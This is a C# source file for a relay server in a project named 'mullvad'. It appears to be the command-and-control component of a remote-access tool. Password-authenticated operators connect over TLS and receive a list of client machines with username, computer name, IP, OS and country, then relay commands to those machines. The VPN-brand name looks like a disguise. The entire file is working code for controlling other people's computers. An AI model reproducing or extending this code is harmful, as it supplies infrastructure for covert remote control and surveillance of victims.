using System.Collections.Concurrent;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using mullvad.Protocol;

namespace mullvad.Network
{
    // Listens for operator connections on a separate port.
    // Operators authenticate with a password, then receive a live feed of all
    // connected client sessions — they can send commands and receive responses
    // exactly as if they were running mullvad.exe locally.
    public sealed class VpsHostServer
    {
        private readonly int    _port;
        private readonly string _password;

        private static X509Certificate2? _cert;
        private static X509Certificate2 SharedCert() => _cert ??= CertificateHelper.GetOrCreate();

        private TcpListener?              _listener;
        private CancellationTokenSource?  _cts;

        private readonly ConcurrentDictionary<string, ClientHandler>   _clients   = new();
        private readonly ConcurrentDictionary<string, OperatorSession> _operators = new();

        public bool IsRunning { get; private set; }
        public int  OperatorCount => _operators.Count;

        public event Action<string>?    StatusChanged;
        public event Action<Exception>? Error;

        public VpsHostServer(int port, string password)
        {
            _port     = port;
            _password = password;
        }

        // ── Lifecycle ─────────────────────────────────────────────────────────

        public void Start()
        {
            if (IsRunning) return;
            _cts      = new CancellationTokenSource();
            _listener = new TcpListener(IPAddress.Any, _port);
            _listener.Start(20);
            IsRunning = true;
            _ = AcceptLoopAsync(_cts.Token);
            StatusChanged?.Invoke($"VPS host listening for operators on port {_port}");
        }

        public void Stop()
        {
            if (!IsRunning) return;
            _cts?.Cancel();
            _listener?.Stop();
            IsRunning = false;
            foreach (var op in _operators.Values) op.Close();
            _operators.Clear();
        }

        // Register a real ClientHandler so its packets are relayed to operators.
        public void RegisterClient(ClientHandler handler)
        {
            _clients[handler.Info.Id] = handler;
            handler.PacketReceived  += OnClientPacketReceived;
            handler.Disconnected    += OnClientDisconnected;

            // Notify all connected operators of the new client
            var joinPkt = Packet.CreateRaw(PacketType.VpsClientJoin, ClientInfoJson(handler.Info));
            BroadcastToOperators(joinPkt);
            UpdateStatus();
        }

        // ── Event handlers for real clients ──────────────────────────────────

        private void OnClientPacketReceived(ClientHandler handler, Packet packet)
        {
            // Skip keepalive packets — handled locally, no need to relay
            if (packet.Type == PacketType.Ping || packet.Type == PacketType.Pong) return;

            var raw   = packet.Serialize();
            var relay = Packet.CreateRaw(PacketType.VpsRelay,
                RelayJson(handler.Info.Id, Convert.ToBase64String(raw)));
            BroadcastToOperators(relay);
        }

        private void OnClientDisconnected(ClientHandler handler)
        {
            _clients.TryRemove(handler.Info.Id, out _);
            handler.PacketReceived -= OnClientPacketReceived;
            handler.Disconnected   -= OnClientDisconnected;

            var leavePkt = Packet.CreateRaw(PacketType.VpsClientLeave,
                $"{{\"id\":\"{handler.Info.Id}\"}}");
            BroadcastToOperators(leavePkt);
            UpdateStatus();
        }

        // ── Operator accept loop ──────────────────────────────────────────────

        private async Task AcceptLoopAsync(CancellationToken ct)
        {
            while (!ct.IsCancellationRequested)
            {
                try
                {
                    var tcp = await _listener!.AcceptTcpClientAsync(ct);
                    tcp.NoDelay = true;
                    _ = HandleOperatorAsync(tcp, ct);
                }
                catch (OperationCanceledException) { break; }
                catch (Exception ex) when (!ct.IsCancellationRequested)
                {
                    Error?.Invoke(ex);
                    break;
                }
            }
            IsRunning = false;
        }

        private async Task HandleOperatorAsync(TcpClient tcp, CancellationToken ct)
        {
            SslStream? ssl = null;
            OperatorSession? session = null;
            using var connCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
            connCts.CancelAfter(TimeSpan.FromSeconds(30));
            var connToken = connCts.Token;
            try
            {
                ssl = new SslStream(tcp.GetStream(), leaveInnerStreamOpen: false);
                await ssl.AuthenticateAsServerAsync(new SslServerAuthenticationOptions
                {
                    ServerCertificate         = SharedCert(),
                    ClientCertificateRequired = false,
                }, connToken);

                // ── Auth handshake ────────────────────────────────────────────
                var authPkt = await Packet.ReadAsync(ssl, connToken);
                if (authPkt is null || authPkt.Type != PacketType.VpsAuth)
                {
                    tcp.Close(); return;
                }

                using var authDoc = JsonDocument.Parse(authPkt.Json);
                var pwd = authDoc.RootElement.TryGetProperty("password", out var p) ? p.GetString() : "";

                if (pwd != _password)
                {
                    var failPkt = Packet.Create(PacketType.VpsAuthFail, new { reason = "wrong password" });
                    await ssl.WriteAsync(failPkt.Serialize(), connToken);
                    tcp.Close(); return;
                }

                await ssl.WriteAsync(Packet.Create(PacketType.VpsAuthOk).Serialize(), connToken);

                // ── Send current client list ──────────────────────────────────
                var listPkt = Packet.CreateRaw(PacketType.VpsClientList, BuildClientListJson());
                await ssl.WriteAsync(listPkt.Serialize(), ct);

                // ── Register and read loop ────────────────────────────────────
                session = new OperatorSession(ssl);
                var opId = Guid.NewGuid().ToString("N")[..8];
                _operators[opId] = session;
                UpdateStatus();

                try
                {
                    while (!ct.IsCancellationRequested)
                    {
                        var pkt = await Packet.ReadAsync(ssl, ct);
                        if (pkt is null) break;

                        if (pkt.Type == PacketType.VpsRelay)
                            HandleRelayFromOperator(pkt.Json);
                    }
                }
                finally
                {
                    _operators.TryRemove(opId, out _);
                    UpdateStatus();
                }
            }
            catch (OperationCanceledException) { }
            catch { }
            finally
            {
                try { ssl?.Dispose(); }  catch { }
                try { tcp.Close(); }     catch { }
            }
        }

        private void HandleRelayFromOperator(string json)
        {
            try
            {
                using var doc = JsonDocument.Parse(json);
                if (!doc.RootElement.TryGetProperty("id",   out var idProp))   return;
                if (!doc.RootElement.TryGetProperty("data", out var dataProp)) return;

                var clientId = idProp.GetString() ?? "";
                var bytes    = Convert.FromBase64String(dataProp.GetString() ?? "");

                if (!_clients.TryGetValue(clientId, out var handler)) return;

                // Deserialize the raw bytes back into a Packet and forward
                using var ms = new MemoryStream(bytes);
                using var cts2 = new CancellationTokenSource(5000);
                var pkt = Packet.ReadAsync(ms, cts2.Token).GetAwaiter().GetResult();
                if (pkt is null) return;

                _ = handler.SendAsync(pkt);
            }
            catch { }
        }

        // ── Helpers ───────────────────────────────────────────────────────────

        private void BroadcastToOperators(Packet pkt)
        {
            var bytes = pkt.Serialize();
            foreach (var op in _operators.Values)
                _ = op.SendAsync(bytes);
        }

        private string BuildClientListJson()
        {
            var sb = new StringBuilder("{\"clients\":[");
            bool first = true;
            foreach (var h in _clients.Values)
            {
                if (!first) sb.Append(',');
                first = false;
                sb.Append(ClientInfoJson(h.Info));
            }
            sb.Append("]}");
            return sb.ToString();
        }

        private static string ClientInfoJson(mullvad.Models.ClientInfo i) =>
            "{\"id\":\""      + Esc(i.Id)           + "\"" +
            ",\"computer\":\"" + Esc(i.Computer)     + "\"" +
            ",\"username\":\"" + Esc(i.Username)     + "\"" +
            ",\"ip\":\""      + Esc(i.IpAddress)     + "\"" +
            ",\"os\":\""      + Esc(i.Os)            + "\"" +
            ",\"os_edition\":\"" + Esc(i.OsEdition)  + "\"" +
            ",\"architecture\":\"" + Esc(i.Architecture) + "\"" +
            ",\"country\":\""  + Esc(i.Country)      + "\"" +
            ",\"version\":\""  + Esc(i.Version)      + "\"}";

        private static string RelayJson(string id, string data64) =>
            "{\"id\":\"" + Esc(id) + "\",\"data\":\"" + data64 + "\"}";

        private static string Esc(string s)
        {
            if (!s.Contains('"') && !s.Contains('\\')) return s;
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"");
        }

        private void UpdateStatus()
        {
            StatusChanged?.Invoke($"VPS host — port {_port} | {_clients.Count} client(s) | {_operators.Count} operator(s)");
        }

        // ── OperatorSession ───────────────────────────────────────────────────

        private sealed class OperatorSession
        {
            private readonly SslStream     _ssl;
            private readonly SemaphoreSlim _lock = new(1, 1);

            public OperatorSession(SslStream ssl) => _ssl = ssl;

            public async Task SendAsync(byte[] bytes)
            {
                await _lock.WaitAsync();
                try { await _ssl.WriteAsync(bytes); } catch { }
                finally { _lock.Release(); }
            }

            public void Close() { try { _ssl.Dispose(); } catch { } }
        }
    }
}
